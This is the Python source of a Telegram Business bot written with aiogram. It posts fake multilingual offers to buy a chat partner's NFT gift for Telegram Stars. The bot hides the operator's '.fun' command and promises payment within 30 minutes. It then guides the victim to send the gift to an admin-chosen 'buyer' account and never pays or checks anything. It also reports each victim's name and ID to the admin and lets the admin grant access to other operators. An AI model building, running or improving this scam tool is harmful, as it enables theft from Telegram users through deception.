import asyncio
import json
import logging
import os
import re
from pathlib import Path
from aiogram import Bot, Dispatcher, Router
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from aiogram.types.business_connection import BusinessConnection
from aiogram.types.message import Message

TOKEN = os.getenv("TOKEN_BOT")
ADMIN_ID = 8722059080
ACCESS_FILE = Path(__file__).resolve().with_name("allowed_users.json")
BUYER_FILE = Path(__file__).resolve().with_name("buyer_username.txt")
PENDING_ACCESS_ACTION: dict[int, str] = {}
PENDING_BUYER_INPUT: set[int] = set()

STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5920433463428650761")
CHECK_EMOJI_ID = os.getenv("CHECK_EMOJI_ID", "5776375003280838798")
CROSS_EMOJI_ID = os.getenv("CROSS_EMOJI_ID", "5778527486270770928")

router = Router()


# ---------- buyer username ----------

def load_buyer_username() -> str | None:
  try:
    username = BUYER_FILE.read_text(encoding="utf-8").strip()
    return username if username else None
  except FileNotFoundError:
    return None


def save_buyer_username(username: str) -> None:
  tmp = BUYER_FILE.with_suffix(".txt.tmp")
  tmp.write_text(username, encoding="utf-8")
  tmp.replace(BUYER_FILE)


# ---------- allowed users ----------

def load_allowed_users() -> set[int]:
  try:
    raw_ids = json.loads(ACCESS_FILE.read_text(encoding="utf-8"))
  except FileNotFoundError:
    return set()

  if not isinstance(raw_ids, list) or any(
      type(user_id) is not int or user_id <= 0 for user_id in raw_ids
  ):
    raise ValueError("Access list must be a JSON array of positive user IDs")

  return set(raw_ids)


def save_allowed_users(user_ids: set[int]) -> None:
  temporary_file = ACCESS_FILE.with_suffix(".json.tmp")
  temporary_file.write_text(
      json.dumps(sorted(user_ids), indent=2),
      encoding="utf-8",
  )
  temporary_file.replace(ACCESS_FILE)


def user_has_access(user_id: int) -> bool:
  return user_id == ADMIN_ID or user_id in load_allowed_users()


async def update_user_access(message: Message, grant: bool) -> None:
  if (
      message.chat.type != "private"
      or not message.from_user
      or message.from_user.id != ADMIN_ID
  ):
    return

  PENDING_ACCESS_ACTION.pop(message.from_user.id, None)
  parts = (message.text or "").split(maxsplit=1)
  if len(parts) != 2 or not parts[1].isascii() or not parts[1].isdigit():
    await message.answer(
        f"Используйте команду так: /{'grant' if grant else 'revoke'} <Telegram ID>",
        reply_markup=get_admin_access_menu(),
    )
    return

  target_id = int(parts[1])
  await apply_access_change(message, target_id, grant)


# ---------- keyboards ----------

def get_admin_access_menu() -> InlineKeyboardMarkup:
  buyer = load_buyer_username()
  buyer_label = f"👤 Покупатель: @{buyer}" if buyer else "👤 Покупатель: не задан"
  return InlineKeyboardMarkup(
      inline_keyboard=[
          [
              InlineKeyboardButton(
                  text="➕ Выдать доступ",
                  callback_data="admin:grant",
              )
          ],
          [
              InlineKeyboardButton(
                  text="➖ Забрать доступ",
                  callback_data="admin:revoke",
              )
          ],
          [
              InlineKeyboardButton(
                  text=buyer_label,
                  callback_data="admin:set_buyer",
              )
          ],
      ]
  )


def get_admin_cancel_keyboard() -> InlineKeyboardMarkup:
  return InlineKeyboardMarkup(
      inline_keyboard=[
          [
              InlineKeyboardButton(
                  text="Отмена",
                  callback_data="admin:cancel",
              )
          ]
      ]
  )


def change_allowed_user(target_id: int, grant: bool) -> str:
  if target_id <= 0:
    return "Telegram ID должен быть положительным числом."
  if target_id == ADMIN_ID:
    return "У администратора всегда остаётся доступ."

  try:
    allowed_users = load_allowed_users()
  except (OSError, ValueError):
    logging.exception("Could not read the authorized-user list")
    return "Не удалось прочитать список доступа. Изменения не сохранены."

  if grant:
    if target_id in allowed_users:
      return f"У ID {target_id} уже есть доступ."
    allowed_users.add(target_id)
  else:
    if target_id not in allowed_users:
      return f"У ID {target_id} и так нет доступа."
    allowed_users.remove(target_id)

  try:
    save_allowed_users(allowed_users)
  except OSError:
    logging.exception("Could not save the authorized-user list")
    return "Не удалось сохранить список доступа."

  result = "выдан" if grant else "отозван"
  return f"Доступ для ID {target_id} {result}."


async def apply_access_change(
    message: Message, target_id: int, grant: bool
) -> None:
  result = change_allowed_user(target_id, grant)
  await message.answer(result, reply_markup=get_admin_access_menu())


def get_custom_emoji_html(emoji_id: str, fallback: str) -> str:
  return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'


def prefix_hash_before_numbers(text: str) -> str:
  return re.sub(r"(?<!#)(?<!\w)(\d+(?:[.,]\d+)*)", r"#\1", text)


def get_gift_link(message: Message) -> str | None:
  for entity in message.entities or []:
    if entity.type == "text_link" and entity.url:
      return entity.url
  return None


# Запасные символы используются только внутри разметки кастомных эмодзи.
EMOJI_STAR = "⭐"
EMOJI_STAR_HTML = get_custom_emoji_html(STAR_EMOJI_ID, EMOJI_STAR)
EMOJI_CHECK = "✅"
EMOJI_CHECK_HTML = get_custom_emoji_html(CHECK_EMOJI_ID, EMOJI_CHECK)
EMOJI_CROSS = "❌"
EMOJI_CROSS_HTML = get_custom_emoji_html(CROSS_EMOJI_ID, EMOJI_CROSS)

LANGUAGES = {
    "ru": {
        "usage": (
            "Неверный формат!\n"
            "Используйте: `.fun <ссылка> <цена> ru|eng|ch|ar`\n"
            "Пример: `.fun https://t.me/nft/DurovsCap-810 67 ru`\n"
            "Языки: ru — русский, eng — английский, ch — китайский, ar — арабский. "
            "Если язык не указан, используется русский."
        ),
        "unknown_language": "Неизвестный язык. Доступные коды: ru, eng, ch, ar.",
        "offer": (
            "Предложение о покупке <a href='{gift_link}'>{raw_name}</a> за "
            "<b>{price} {star}</b>.\n\n"
            "Предложение действует еще 5ч. 59м."
        ),
        "username_required": (
            "У отправителя команды нет username Telegram. Добавьте username "
            "в настройках и повторите команду."
        ),
        "seller_not_found": (
            "В этом предложении не сохранён username продавца. Создайте новое "
            "предложение командой .fun."
        ),
        "validity": "Предложение действует еще 5ч. 59м.",
        "decline_button": "Отклонить",
        "accept_button": "Принять",
        "transfer_button": "Передать NFT",
        "confirm_button": "Подтвердить передачу",
        "declined_button": "Отклонено",
        "accept_alert": (
            "Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок "
            "и получить звёзды.\n\nНажмите «ОК», если вы прочитали это сообщение."
        ),
        "gift_not_found": "Не удалось найти ссылку на подарок.",
        "accepted": (
            "{check} Предложение принято.\n\n"
            "Нажмите кнопку ниже и передайте нужный NFT по кнопке ниже — "
            "после этого <b>{price}</b> {star} поступят на баланс Telegram в течение 30 минут.\n\n"
            "Нажмите «Передать NFT» ➔ откроется профиль ➔ выберите нужный подарок и отправьте"
        ),
        "instruction_title": "Инструкция",
        "instruction": (
            'Перейдите в профиль покупателя ➔ Нажмите на "ещё" ➔ '
            '"Отправить подарок" ➔ Выберите подарок'
        ),
        "manual_transfer": (
            "Передача отмечена вручную. Бот не проверяет факт отправки NFT."
        ),
        "declined": "Предложение отклонено.",
        "price_marker": "за",
    },
    "eng": {
        "usage": (
            "Invalid format!\n"
            "Use: `.fun <link> <price> ru|eng|ch|ar`\n"
            "Example: `.fun https://t.me/nft/DurovsCap-810 67 eng`\n"
            "Languages: ru — Russian, eng — English, ch — Chinese, ar — Arabic. "
            "If omitted, Russian is used."
        ),
        "unknown_language": "Unknown language. Available codes: ru, eng, ch, ar.",
        "offer": (
            "Offer to buy <a href='{gift_link}'>{raw_name}</a> for "
            "<b>{price} {star}</b>.\n\n"
            "This offer is valid for another 5h 59m."
        ),
        "username_required": (
            "The command sender has no Telegram username. Add a username in "
            "Telegram settings and try again."
        ),
        "seller_not_found": (
            "This offer has no saved seller username. Create a new offer "
            "with the .fun command."
        ),
        "validity": "This offer is valid for another 5h 59m.",
        "decline_button": "Decline",
        "accept_button": "Accept",
        "transfer_button": "Transfer NFT",
        "confirm_button": "Confirm transfer",
        "declined_button": "Declined",
        "accept_alert": (
            "Attention!\n\nFollow the instructions so you can receive your "
            "Stars without losing the gift.\n\nPress "OK" if you have read "
            "this message."
        ),
        "gift_not_found": "Could not find the gift link.",
        "accepted": (
            "{check} Offer accepted.\n\n"
            "To receive <b>{price}</b> {star} transfer the NFT using the button below."
        ),
        "instruction_title": "Instructions",
        "instruction": (
            'Open the buyer\'s profile ➔ Tap "More" ➔ "Send a Gift" ➔ '
            "Select the gift"
        ),
        "manual_transfer": (
            "Transfer marked manually. The bot does not verify that the NFT "
            "was sent."
        ),
        "declined": "Offer declined.",
        "price_marker": "for",
    },
    "ch": {
        "usage": (
            "格式错误！\n"
            "请使用：`.fun <链接> <价格> ru|eng|ch|ar`\n"
            "示例：`.fun https://t.me/nft/DurovsCap-810 67 ch`\n"
            "语言代码：ru — 俄语，eng — 英语，ch — 中文，ar — 阿拉伯语。"
            "不填写时默认使用俄语。"
        ),
        "unknown_language": "未知语言。可用代码：ru、eng、ch、ar。",
        "offer": (
            "购买 <a href='{gift_link}'>{raw_name}</a> 的报价为 "
            "<b>{price} {star}</b>。\n\n"
            "此报价还剩 5 小时 59 分钟有效。"
        ),
        "username_required": (
            "命令发送者没有 Telegram 用户名。请先在 Telegram 设置中添加用户名，"
            "然后重试。"
        ),
        "seller_not_found": (
            "此报价没有保存卖家的用户名。请使用 .fun 命令重新创建报价。"
        ),
        "validity": "此报价还剩 5 小时 59 分钟有效。",
        "decline_button": "拒绝",
        "accept_button": "接受",
        "transfer_button": "转让 NFT",
        "confirm_button": "确认转让",
        "declined_button": "已拒绝",
        "accept_alert": (
            "请注意！\n\n请按照说明操作，以免丢失礼物并收到 Telegram 星星。\n\n"
            "阅读完毕后请点击"确定"。"
        ),
        "gift_not_found": "无法找到礼物链接。",
        "accepted": (
            "{check} 已接受报价。\n\n"
            "请点击下方按钮转让 NFT，即可获得 <b>{price}</b> {star}。"
        ),
        "instruction_title": "操作说明",
        "instruction": (
            "打开买家个人资料 ➔ 点击"更多" ➔"发送礼物" ➔ 选择礼物"
        ),
        "manual_transfer": "已手动标记转让。机器人不会核实 NFT 是否已发送。",
        "declined": "报价已拒绝。",
        "price_marker": "报价为",
    },
    "ar": {
        "usage": (
            "تنسيق غير صحيح!\n"
            "استخدم: `.fun <link> <price> ar`\n"
            "مثال: `.fun https://t.me/nft/DurovsCap-810 67 ar`\n"
            "اللغات: ru — الروسية، eng — الإنجليزية، ch — الصينية، ar — العربية. "
            "إذا لم تحدد اللغة، فسيتم استخدام الروسية."
        ),
        "unknown_language": (
            "لغة غير معروفة. الرموز المتاحة: ru, eng, ch, ar."
        ),
        "offer": (
            "عرض لشراء <a href='{gift_link}'>{raw_name}</a> مقابل "
            "<b>{price} {star}</b>.\n\n"
            "هذا العرض صالح لمدة 5 ساعات و59 دقيقة أخرى."
        ),
        "username_required": (
            "لا يملك مرسل الأمر اسم مستخدم في Telegram. أضف اسم مستخدم في "
            "إعدادات Telegram ثم أعد المحاولة."
        ),
        "seller_not_found": (
            "لا يحتوي هذا العرض على اسم مستخدم البائع. أنشئ عرضًا جديدًا "
            "باستخدام الأمر .fun."
        ),
        "validity": "هذا العرض صالح لمدة 5 ساعات و59 دقيقة أخرى.",
        "decline_button": "رفض",
        "accept_button": "قبول",
        "transfer_button": "نقل NFT",
        "confirm_button": "تأكيد النقل",
        "declined_button": "مرفوض",
        "accept_alert": (
            "تنبيه!\n\nاتبع التعليمات حتى تتلقى النجوم دون فقدان الهدية.\n\n"
            "اضغط «موافق» إذا قرأت هذه الرسالة."
        ),
        "gift_not_found": "تعذر العثور على رابط الهدية.",
        "accepted": (
            "{check} تم قبول العرض.\n\n"
            "للحصول على <b>{price}</b> {star} انقل NFT بالضغط على الزر أدناه."
        ),
        "instruction_title": "التعليمات",
        "instruction": (
            "انتقل إلى الملف الشخصي للمشتري ➔ اضغط على «المزيد» ➔ "
            "«إرسال هدية» ➔ اختر الهدية"
        ),
        "manual_transfer": (
            "تم وضع علامة على النقل يدويًا. لا يتحقق البوت من إرسال NFT."
        ),
        "declined": "تم رفض العرض.",
        "price_marker": "مقابل",
    },
}


def get_gift_keyboard(
    status: str = "active",
    language: str = "ru",
    seller_username: str | None = None,
):
  text = LANGUAGES.get(language, LANGUAGES["ru"])
  # Берём глобальный username покупателя
  buyer_username = load_buyer_username()

  if status == "accepted":
    inline_keyboard = []
    # Кнопка «Передать NFT» ведёт к покупателю (глобальный username)
    if buyer_username and re.fullmatch(r"[A-Za-z0-9_]{5,32}", buyer_username):
      inline_keyboard.append(
          [
              InlineKeyboardButton(
                  text=text["transfer_button"],
                  url=f"tg://send_gift?to={buyer_username}",
              )
          ]
      )
    inline_keyboard.append(
        [
            InlineKeyboardButton(
                text=text["confirm_button"],
                icon_custom_emoji_id=CHECK_EMOJI_ID,
                callback_data=f"confirm_transfer:{language}",
            )
        ]
    )
    return InlineKeyboardMarkup(inline_keyboard=inline_keyboard)
  elif status == "declined":
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=text["declined_button"],
                    icon_custom_emoji_id=CROSS_EMOJI_ID,
                    callback_data=f"noop:{language}",
                )
            ]
        ]
    )
  else:
    accept_callback = f"accept:{language}"
    if seller_username:
      accept_callback = f"{accept_callback}:{seller_username}"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=text["decline_button"],
                    icon_custom_emoji_id=CROSS_EMOJI_ID,
                    callback_data=f"decline:{language}",
                ),
                InlineKeyboardButton(
                    text=text["accept_button"],
                    icon_custom_emoji_id=CHECK_EMOJI_ID,
                    callback_data=accept_callback,
                ),
            ],
        ]
    )


# Перехват команды .fun через Telegram Business в личных чатах
@router.business_message()
async def handle_business_message(message: Message, bot: Bot):
  if not message.text:
    return

  if message.text.startswith(".fun"):
    sender = message.from_user
    if not sender:
      return
    try:
      if not user_has_access(sender.id):
        logging.info(
            "Ignored .fun command from unauthorized user id %s",
            sender.id,
        )
        return
    except (OSError, ValueError):
      logging.exception("Could not load the authorized-user list; rejecting .fun")
      return

    args = message.text.split(maxsplit=3)
    language = "ru"
    usage = LANGUAGES["ru"]["usage"]
    seller_username = None

    if len(args) == 4 and args[3].lower() in LANGUAGES:
      language = args[3].lower()
      gift_link = args[1]
      price = args[2].removeprefix("#")
    elif len(args) == 3:
      gift_link = args[1]
      price = args[2].removeprefix("#")
    elif len(args) == 4:
      await bot.send_message(
          chat_id=message.chat.id,
          text=f"{LANGUAGES['ru']['unknown_language']}\n{usage}",
          business_connection_id=message.business_connection_id,
      )
      return
    else:
      await bot.send_message(
          chat_id=message.chat.id,
          text=usage,
          business_connection_id=message.business_connection_id,
      )
      return

    if sender and sender.username:
      candidate_username = sender.username.lstrip("@")
      if re.fullmatch(r"[A-Za-z0-9_]{5,32}", candidate_username):
        seller_username = candidate_username

    if not seller_username:
      await bot.send_message(
          chat_id=message.chat.id,
          text=LANGUAGES[language]["username_required"],
          business_connection_id=message.business_connection_id,
      )
      return

    raw_name = prefix_hash_before_numbers(
        gift_link.split("/")[-1].replace("-", " ")
    )

    text = LANGUAGES[language]["offer"].format(
        gift_link=gift_link,
        raw_name=raw_name,
        price=price,
        star=EMOJI_STAR_HTML,
    )

    try:
      deleted = await bot.delete_business_messages(
          business_connection_id=message.business_connection_id,
          message_ids=[message.message_id],
      )
      if not deleted:
        logging.warning("Telegram did not delete the .fun command message")
    except Exception:
      logging.exception(
          "Failed to delete the .fun command; check the can_delete_all_messages permission"
      )

    await bot.send_message(
        chat_id=message.chat.id,
        text=text,
        reply_markup=get_gift_keyboard("active", language, seller_username),
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(
            url=gift_link, show_above_text=True
        ),
        business_connection_id=message.business_connection_id,
    )


@router.callback_query()
async def handle_callbacks(callback, bot: Bot):
  callback_data = callback.data or ""
  if callback_data.startswith("admin:"):
    if (
        callback.from_user.id != ADMIN_ID
        or not callback.message
        or callback.message.chat.type != "private"
    ):
      await callback.answer("Недоступно.", show_alert=True)
      return

    menu_action = callback_data.split(":", maxsplit=1)[1]

    if menu_action in {"grant", "revoke"}:
      PENDING_ACCESS_ACTION[ADMIN_ID] = menu_action
      PENDING_BUYER_INPUT.discard(ADMIN_ID)
      action_text = (
          "выдать доступ"
          if menu_action == "grant"
          else "забрать доступ"
      )
      await callback.answer()
      await callback.message.edit_text(
          f"Пришлите Telegram ID пользователя, которому нужно {action_text}.",
          reply_markup=get_admin_cancel_keyboard(),
      )
      return

    if menu_action == "set_buyer":
      PENDING_BUYER_INPUT.add(ADMIN_ID)
      PENDING_ACCESS_ACTION.pop(ADMIN_ID, None)
      await callback.answer()
      current = load_buyer_username()
      current_text = f"Текущий: @{current}\n\n" if current else ""
      await callback.message.edit_text(
          f"{current_text}Пришлите новый username покупателя (без @).",
          reply_markup=get_admin_cancel_keyboard(),
      )
      return

    if menu_action == "cancel":
      PENDING_ACCESS_ACTION.pop(ADMIN_ID, None)
      PENDING_BUYER_INPUT.discard(ADMIN_ID)
      await callback.answer()
      await callback.message.edit_text(
          "Меню управления доступом:",
          reply_markup=get_admin_access_menu(),
      )
      return

    await callback.answer()
    return

  parts = (callback.data or "").split(":", maxsplit=2)
  action = parts[0]
  language = parts[1] if len(parts) > 1 else "ru"
  seller_username = parts[2] if len(parts) > 2 else None
  if language not in LANGUAGES:
    language = "ru"
  if not seller_username or not re.fullmatch(
      r"[A-Za-z0-9_]{5,32}", seller_username
  ):
    seller_username = None
  text = LANGUAGES[language]

  if action == "accept":
    original_text = callback.message.text or ""
    gift_link = get_gift_link(callback.message)
    if not gift_link:
      await callback.answer(
          text=text["gift_not_found"],
          show_alert=True,
      )
      return

    if not seller_username:
      await callback.answer(text=text["seller_not_found"], show_alert=True)
      return

    await callback.answer(text=text["accept_alert"], show_alert=True)

    raw_name = prefix_hash_before_numbers(
        gift_link.split("/")[-1].replace("-", " ")
    )

    price_match = re.search(
        rf"{re.escape(text['price_marker'])}\s*#?(\d+(?:[.,]\d+)*)",
        original_text,
        flags=re.IGNORECASE,
    )
    price_part = price_match.group(1) if price_match else "67"

    clicker = callback.from_user
    clicker_username = (
        f"@{clicker.username}" if clicker.username else "username не указан"
    )
    notification_text = (
        "Пользователь принял предложение.\n\n"
        f"Пользователь: {clicker.full_name} ({clicker_username})\n"
        f"Telegram ID: {clicker.id}\n"
        f"Подарок: {raw_name}\n"
        f"Цена: {price_part} звёзд Telegram\n"
        f"Ссылка: {gift_link}"
    )
    try:
      await bot.send_message(
          chat_id=ADMIN_ID,
          text=notification_text,
          link_preview_options=LinkPreviewOptions(is_disabled=True),
      )
      logging.info(
          "Sent offer acceptance notification to admin id %s",
          ADMIN_ID,
      )
    except Exception:
      logging.exception(
          "Could not send offer acceptance notification to admin id %s; "
          "the admin may need to start a private chat with the bot",
          ADMIN_ID,
      )

    new_text = text["accepted"].format(
        check=EMOJI_CHECK_HTML,
        gift_link=gift_link,
        raw_name=raw_name,
        price=price_part,
        star=EMOJI_STAR_HTML,
        validity=text["validity"],
        instruction_title=text["instruction_title"],
        instruction=text["instruction"],
    )

    try:
      await callback.message.edit_text(
          new_text,
          reply_markup=get_gift_keyboard(
              "accepted", language, seller_username
          ),
          parse_mode="HTML",
          link_preview_options=LinkPreviewOptions(
              url=gift_link, show_above_text=True
          ),
      )
    except Exception:
      logging.exception("Failed to update the accepted Telegram offer message")

  elif action == "confirm_transfer":
    await callback.answer(
        text=text["manual_transfer"],
        show_alert=True,
    )

  elif action == "decline":
    await callback.answer(text["declined"])
    try:
      gift_link = get_gift_link(callback.message)
      if not gift_link:
        await callback.answer(
            text=text["gift_not_found"],
            show_alert=True,
        )
        return
      raw_name = prefix_hash_before_numbers(
          gift_link.split("/")[-1].replace("-", " ")
      )

      new_text = (
          f"<a href='{gift_link}'>{raw_name}</a>\n\n"
          f"{EMOJI_CROSS_HTML} <b>{text['declined']}</b>"
      )
      await callback.message.edit_text(
          new_text,
          reply_markup=get_gift_keyboard("declined", language),
          parse_mode="HTML",
          link_preview_options=LinkPreviewOptions(
              url=gift_link, show_above_text=True
          ),
      )
    except Exception:
      pass
  else:
    await callback.answer()


@router.message(CommandStart())
async def handle_start(message: Message):
  if message.chat.type != "private" or not message.from_user:
    return
  if message.from_user.id == ADMIN_ID:
    PENDING_ACCESS_ACTION.pop(ADMIN_ID, None)
    PENDING_BUYER_INPUT.discard(ADMIN_ID)
    await message.answer(
        "Меню управления доступом. Уведомления о принятых предложениях "
        "будут приходить сюда.\n"
        "Также доступны команды /grant <ID> и /revoke <ID>.",
        reply_markup=get_admin_access_menu(),
    )
    return
  await message.answer(
      "Доступ к команде .fun есть только у пользователей, которым его выдал "
      "администратор."
  )


@router.message(Command("grant"))
async def grant_access(message: Message):
  await update_user_access(message, grant=True)


@router.message(Command("revoke"))
async def revoke_access(message: Message):
  await update_user_access(message, grant=False)


@router.message()
async def handle_admin_access_id(message: Message):
  if (
      message.chat.type != "private"
      or not message.from_user
      or message.from_user.id != ADMIN_ID
  ):
    return

  # Обработка ввода username покупателя
  if ADMIN_ID in PENDING_BUYER_INPUT:
    raw = (message.text or "").strip().lstrip("@")
    if not re.fullmatch(r"[A-Za-z0-9_]{5,32}", raw):
      await message.answer(
          "Неверный формат username. Пришлите username без @ (5–32 символа, "
          "только буквы, цифры и _).",
          reply_markup=get_admin_cancel_keyboard(),
      )
      return
    PENDING_BUYER_INPUT.discard(ADMIN_ID)
    try:
      save_buyer_username(raw)
      await message.answer(
          f"✅ Username покупателя сохранён: @{raw}",
          reply_markup=get_admin_access_menu(),
      )
    except OSError:
      logging.exception("Could not save buyer username")
      await message.answer(
          "Не удалось сохранить username. Попробуйте ещё раз.",
          reply_markup=get_admin_access_menu(),
      )
    return

  # Обработка ввода Telegram ID для grant/revoke
  action = PENDING_ACCESS_ACTION.get(ADMIN_ID)
  if action not in {"grant", "revoke"}:
    return

  raw_id = (message.text or "").strip()
  if not raw_id.isascii() or not raw_id.isdigit():
    await message.answer(
        "Пришлите только числовой Telegram ID или нажмите «Отмена».",
        reply_markup=get_admin_cancel_keyboard(),
    )
    return

  PENDING_ACCESS_ACTION.pop(ADMIN_ID, None)
  await apply_access_change(
      message,
      int(raw_id),
      grant=(action == "grant"),
  )


async def main():
  logging.basicConfig(level=logging.INFO)
  bot = Bot(token=TOKEN)
  dp = Dispatcher()
  dp.include_router(router)

  await bot.delete_webhook(drop_pending_updates=True)
  print("Telegram Business бот запущен!")
  await dp.start_polling(bot)


if __name__ == "__main__":
  asyncio.run(main())
